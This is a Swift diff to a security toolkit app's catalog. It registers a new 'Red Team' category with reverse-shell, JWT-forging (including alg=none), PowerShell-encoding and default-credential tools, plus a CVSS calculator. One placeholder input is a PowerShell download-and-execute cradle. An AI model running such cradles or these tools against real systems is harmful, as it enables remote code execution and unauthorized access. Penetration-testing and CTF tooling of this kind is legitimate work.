@@ -1,11 +1,12 @@
 import Foundation
 
 public enum ToolCategory: String, CaseIterable, Sendable, Identifiable {
-    case ctf = "CTF", dns = "DNS", osint = "OSINT", web = "Web", network = "Network", utility = "Utilities", generators = "Generators"
+    case ctf = "CTF", redteam = "Red Team", dns = "DNS", osint = "OSINT", web = "Web", network = "Network", utility = "Utilities", generators = "Generators"
     public var id: String { rawValue }
     public var icon: String {
         switch self {
         case .ctf: return "flag.checkered"
+        case .redteam: return "flame"
         case .dns: return "point.3.connected.trianglepath.dotted"
         case .osint: return "eye"
         case .web: return "globe"
@@ -131,6 +132,24 @@ public enum ToolCatalog {
         tools.append(ToolSpec("alphabets", "Alphabet Decoders", "NATO phonetic · Braille · tap code", icon: "character.phonetic", .ctf,
                               input: "Encoded text", placeholder: "Hotel Echo Lima Lima Oscar  ·  ⠓⠑⠇⠇⠕", multiline: true) { input, _ in
             AlphabetDecoders.run(input)
+        })
+        tools.append(ToolSpec("jwt-forge", "JWT Forge", "Mint a signed (or alg=none) token from a payload", icon: "signature", .ctf,
+                              input: "secret :: payload JSON", placeholder: "mysecret :: {\"user\":\"admin\",\"admin\":true}", multiline: true) { input, _ in
+            JWTCrack.runForge(input)
+        })
+
+        // MARK: Red Team
+        tools.append(ToolSpec("revshell", "Reverse Shell Generator", "One-liners for bash, python, nc, PowerShell… + listeners", icon: "terminal", .redteam,
+                              input: "LHOST:LPORT", placeholder: "10.10.14.3:4444") { input, _ in
+            RedTeam.runReverseShell(input)
+        })
+        tools.append(ToolSpec("ps-encode", "PowerShell Encoder", "Build a -EncodedCommand (UTF-16LE Base64) payload", icon: "chevron.left.forwardslash.chevron.right", .redteam,
+                              input: "PowerShell command", placeholder: "IEX(New-Object Net.WebClient).DownloadString('http://…')", multiline: true) { input, _ in
+            RedTeam.runPowerShellEncode(input)
+        })
+        tools.append(ToolSpec("default-creds", "Default Credentials", "Factory logins for routers, DBs, apps & devices", icon: "key.radiowaves.forward", .redteam,
+                              input: "Product (optional)", placeholder: "tomcat · cisco · mysql · camera", optional: true) { input, _ in
+            RedTeam.runDefaultCreds(input)
         })
         tools.append(ToolSpec("numbers", "Base Converter", "Decimal ⇄ hex ⇄ octal ⇄ binary ⇄ ASCII", icon: "number.square", .ctf,
                               input: "Number or text", placeholder: "0x41  ·  65  ·  hello") { input, _ in
@@ -348,6 +367,10 @@ public enum ToolCatalog {
         tools.append(ToolSpec("textfun", "Text Transformer", "Leetspeak, reversed, upside-down, full-width, mocking", icon: "textformat.alt", .utility,
                               input: "Text", placeholder: "Hack the planet", multiline: true) { input, _ in
             TextFun.run(input)
+        })
+        tools.append(ToolSpec("cvss", "CVSS Calculator", "CVSS v3.1 base score & severity from a vector", icon: "gauge.with.dots.needle.67percent", .utility,
+                              input: "CVSS vector", placeholder: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H") { input, _ in
+            CVSS.run(input)
         })
 
         // MARK: Generators
